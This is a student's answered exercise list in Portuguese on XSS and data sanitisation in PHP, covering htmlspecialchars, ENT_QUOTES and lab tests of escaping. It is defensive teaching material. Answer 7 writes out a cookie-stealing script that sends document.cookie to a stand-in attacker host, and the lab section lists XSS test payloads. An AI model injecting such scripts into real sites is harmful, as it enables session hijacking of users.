# LISTA DE EXERCÍCIOS: SEGURANÇA E HIGIENIZAÇÃO DE DADOS 


## Parte A: Exercícios Teóricos de Fixação

**1. Conceituação OWASP: O que significa a sigla XSS e por que ela é classificada como uma vulnerabilidade no lado do cliente (Client-Side) que deve ser prevenida pelo Back-End?**
XSS quer dizer Cross-Site Scripting. É quando um site inclui um dado que não é confiável dentro de uma página, sem validar ou escapar esse dado direito. Com isso, um atacante consegue fazer um script malicioso rodar no navegador de quem visita o site.

Ela é uma vulnerabilidade do lado do cliente porque é no navegador da vítima que o script malicioso é executado (é lá que ele rouba cookie, faz keylogger, redireciona a página, etc). Mas quem precisa prevenir isso é o Back-End, porque é o servidor que recebe o dado do usuário e decide como ele vai aparecer na tela. Se o Back-End validar, sanitizar e escapar esse dado antes de mostrar na página, o navegador nunca vai interpretar aquilo como código.

---

**2. Reflected vs Stored: Qual é a diferença entre um ataque XSS Refletido e um XSS Gravado (Stored)? Qual dos dois apresenta maior potencial de estrago para uma empresa e por quê?**

- XSS Refletido: o código malicioso vem direto na requisição (por exemplo, em um link ou em um campo de busca) e o servidor devolve ele na resposta na hora, sem guardar em lugar nenhum. Só funciona se a vítima clicar em um link malicioso.

- XSS Gravado (Stored): o código malicioso fica salvo no banco de dados (em um comentário, por exemplo). Todo usuário que abrir aquela página vai executar o script automaticamente, sem precisar clicar em nada.

O Stored é mais perigoso, porque não depende de a vítima clicar em nada e atinge todo mundo que ver aquela página, não só uma pessoa.

---

**3. Mecanismo de Escapamento: Explique detalhadamente a transformação que a função htmlspecialchars() realiza nos caracteres < e >. Por que o navegador não executa o código após essa transformação?**

Essa função não apaga nem interpreta os caracteres `<` e `>`, ela só troca eles por outro código de texto, chamado entidade HTML. O `<` vira `&lt;` e o `>` vira `&gt;`.

O navegador só reconhece uma tag (como `<script>`) quando encontra o caractere `<` de verdade, seguido do nome da tag. Quando esse `<` foi trocado pela sequência de texto `&lt;`, o navegador não entende mais aquilo como o início de uma tag, ele entende como texto normal. Por isso, na tela, aparece o símbolo `<` escrito, mas o navegador não monta a tag `<script>` e, consequentemente, não executa o código que estaria dentro dela.

---

**4. Flags de Proteção: Qual é a função da flag ENT_QUOTES na chamada de htmlspecialchars()? O que pode acontecer se essa flag for omitida em um campo `<input value="...">?`**

Ela faz a função converter tanto aspas duplas (") quanto aspas simples ('). Se essa flag for esquecida em um campo como `<input type="text" value="...">`e o valor do usuário tiver uma aspas simples seguida de código, essa aspas pode acabar fechando o atributo value mais cedo do que deveria.

---

**5. Anti-Alucinação PHP: Por que não devemos utilizar o filtro FILTER_SANITIZE_STRING em projetos modernos desenvolvidos em PHP 8.3?** 

Porque esse filtro está descontinuado e não é mais recomendado. Ele dava uma falsa sensação de segurança, porque só fazia uma limpeza simples e não protegia de verdade contra todos os tipos de ataque XSS. A forma correta hoje é sempre escapar o dado na saída com htmlspecialchars(), e não tentar "limpar" o texto genericamente na entrada.

---

**6. Validação de E-mail: Qual é a diferença prática entre verificar um e-mail com empty($email) e verificar com filter_var($email, FILTER_VALIDATE_EMAIL)?**

`empty($email)` só verifica se o campo foi preenchido ou não. Uma string qualquer, tipo "senai", já passaria nessa verificação, porque não está vazia. Já `filter_var($email, FILTER_VALIDATE_EMAIL)` verifica se o texto realmente tem o formato de um e-mail (com @ e domínio válido). Se não tiver, a função retorna `false`.

---

**7. Roubo de Sessão: Como um atacante pode usar uma brecha XSS para capturar o cookie de sessão de um usuário logado?** 

O atacante injeta um script parecido com esse:
`<script>fetch('https://site-do-atacante.com/roubo?cookie=' + document.cookie);</script>`
Quando a vítima, já logada, abre essa página, o navegador dela executa o script sem ela perceber. O document.cookie lê os cookies do navegador, incluindo o de sessão, e o script envia esse cookie para o servidor do atacante. Com o cookie em mãos, o atacante consegue entrar na conta da vítima sem precisar da senha.

---

**8. Segurança em Camadas: Por que sanitizar na entrada (ex: com strip_tags) não elimina a necessidade de codificar na saída com htmlspecialchars()?**

Sanitizar na entrada (como usar `strip_tags()` ou `trim()`) tenta limpar o dado antes de guardar ele. Mas isso não garante proteção total, porque existem formas de burlar essa limpeza, e também porque o dado pode chegar ao sistema por outros caminhos que não passam por essa sanitização (como uma importação de banco ou uma integração externa).

Já o escapamento na saída com `htmlspecialchars()` acontece bem na hora em que o dado vai ser mostrado na tela, então garante que, não importa de onde o dado veio ou o que aconteceu com ele antes, ele nunca vai ser interpretado como código pelo navegador. Por isso as duas coisas são importantes, mas quem realmente impede o XSS de funcionar é o escapamento na saída.

## Parte B: Exercícios Práticos no Laboratório

**Testes e resultados:**

ex01:
Digitando no campo "Mensagem": <script>alert('Mural Invadido')</script> ao publicar, a mensagem NÃO vai executar o alert. Ela vai aparecer na tela literalmente como texto: <script>alert('Mural Invadido')</script>. Isso acontece porque a função e() converteu o "<" em "&lt;" e o ">" em "&gt;" antes de o navegador ler o HTML, então ele nunca reconhece a tag `<script>` como código de verdade.

![alt text](image.png)
![alt text](image-1.png)

---

ex02:

![alt text](image-3.png)

Tentando cadastrar o link: javascript:alert(document.cookie) a função filter_var() até pode considerar essa string uma URL válida (o formato "protocolo:conteudo" é aceito), mas ela nao passa no segundo teste (str_starts_with com http:// ou https://). Por isso o link é rejeitado antes mesmo de chegar perto de virar um <a href>.
![alt text](image-2.png)

---

ex03: 
Acessanso a página com o parâmetro: ?q="><script>alert('XSS')</script>
Sem proteção, esse payload fecharia o atributo value="..." do input (por causa da aspas dupla logo no início) e injetaria uma tag `<script>`nova, executando o alert.
Com a flag ENT_QUOTES dentro da função e(), a aspas dupla do payload é convertida para &quot; ANTES de ser impressa. Como a aspas nunca chega "crua" ao HTML, o atributo value="..." nunca é fechado prematuramente, e o restante do payload (<script>alert...</script>) continua sendo apenas texto dentro do valor do atributo, sem nunca
virar uma tag HTML de verdade.
![alt text](image-4.png)

---

ex04:
![alt text](image-5.png)

---

ex05:

DESAFIO DE ORDEM DE EXECUÇÃO: nl2br(e($mensagem)) x e(nl2br($mensagem))

A ordem CORRETA é nl2br(e($mensagem)):
1º) e($mensagem) escapa o texto inteiro, convertendo < > " ' & em entidades HTML. Isso NÃO afeta as quebras de linha ("\n"), porque quebra de linha não é um caractere especial de HTML.
2º) nl2br() então transforma cada "\n" (que continua intacto) em uma tag real "<br>", que o navegador exibe como uma quebra de linha visual.

Se fizermos e(nl2br($mensagem)) (ERRADO):
1º) nl2br() insere as tags "<br>" no meio do texto.
2º) e() escapa TUDO depois, incluindo as tags "<br>" que acabaram de ser criadas, transformando-as em "&lt;br&gt;".
Resultado: o navegador não exibe uma quebra de linha, ele mostra literalmente o texto "<br>" escrito na tela para o usuário, o que quebra completamente a formatação do chat.
Por isso, a ordem certa é sempre: primeiro escapar (e), depois formatar a quebra de linha (nl2br) por cima do texto já seguro.

![alt text](image-6.png)
![alt text](image-8.png)
![alt text](image-7.png)
![alt text](image-9.png)
![alt text](image-10.png)